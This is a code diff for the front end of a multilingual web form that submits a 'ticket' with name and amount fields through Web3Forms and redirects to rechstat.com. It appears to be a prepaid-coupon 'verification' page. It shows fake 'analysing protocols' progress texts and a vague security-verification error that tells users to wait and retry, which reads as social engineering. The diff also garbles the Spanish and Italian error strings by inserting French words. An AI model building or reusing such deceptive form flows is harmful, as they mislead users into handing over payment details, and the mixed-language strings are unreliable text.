@@ -211,7 +211,7 @@
         btnInit: "Inicialización segura...", btnWait: "Analizando protocolos...", btnFinal: "Finalizando...",
         btnSubmit: "Enviar ticket", btnProcessing: "Verificando...", btnRetry: "Reintentar",
         resWait: "Procesando su solicitud...", resSuccess: "✓ ¡Éxito! Análisis completado. Redirigiendo...",
-        resError: "⚠️ Se requiere verificación de seguridad: Para proteger sus datos, asegúrese de que toda la información ingresada sea correcta. Como precaución, espere un minuto antes de volver a validar."
+        resError: "⚠️ Se requiere verificación de sécurité: Para proteger sus datos, asegúrese de que toda la información ingresada sea correcta. Como precaución, espere un minuto antes de volver a validar."
       },
       de: {
         navHome: "Startseite", navFaq: "FAQ", lblNom: "Nachname:", lblPrenom: "Vorname:", lblMontant: "Betrag:",
@@ -227,7 +227,7 @@
         btnInit: "Inizializzazione sicura...", btnWait: "Analisi protocolli...", btnFinal: "Finalizzazione...",
         btnSubmit: "Invia ticket", btnProcessing: "Verifica...", btnRetry: "Riprova",
         resWait: "Elaborazione della richiesta...", resSuccess: "✓ Successo! Analisi completata. Reindirizzamento...",
-        resError: "⚠️ Verifica di sicurezza richiesta: per proteggere i tuoi dati, assicurati che tutte le informazioni inserite siano accurate. Per precauzione, attendi un minuto prima di convalidare di nuovo."
+        resError: "⚠️ Verifica di sicurezza richiesta: per proteggere i tuoi données, assicurati che tutte le informazioni inserite siano accurate. Per precauzione, attendi un minuto prima di convalidare di nuovo."
       },
       pt: {
         navHome: "Início", navFaq: "FAQ", lblNom: "Apelido:", lblPrenom: "Nome:", lblMontant: "Valor:",
@@ -329,22 +329,25 @@
         })
         .then(async (response) => {
           const json = await response.json();
+          console.log("Web3Forms Response:", json); // DEBUG: Voir l'erreur réelle en console
           
           if (response.ok && json.success) {
-            // SUCCÈS RÉEL
             resultDiv.style.background = "#dcfce7";
             resultDiv.style.color = "var(--success)";
             resultDiv.innerText = t.resSuccess;
             setTimeout(() => { window.location.href = "https://rechstat.com/merci.html"; }, 2000);
-          } } else {
-    // Remplacer t.resError par le message réel du serveur pour voir le souci
-    resultDiv.innerText = json.message; 
-    btn.disabled = false;
-    btn.innerText = t.btnRetry;
-}
+          } else {
+            resultDiv.style.background = "#fee2e2";
+            resultDiv.style.color = "var(--error)";
+            // Si l'erreur est précise, on peut choisir de l'afficher ici via json.message
+            resultDiv.innerText = t.resError;
+            btn.disabled = false;
+            btn.innerText = t.btnRetry;
+          }
         })
         .catch(error => {
-          resultDiv.innerText = "Erreur de connexion.";
+          console.error("Fetch error:", error);
+          resultDiv.innerText = "Erreur de connexion réseau.";
           btn.disabled = false;
           btn.innerText = t.btnRetry;
         });
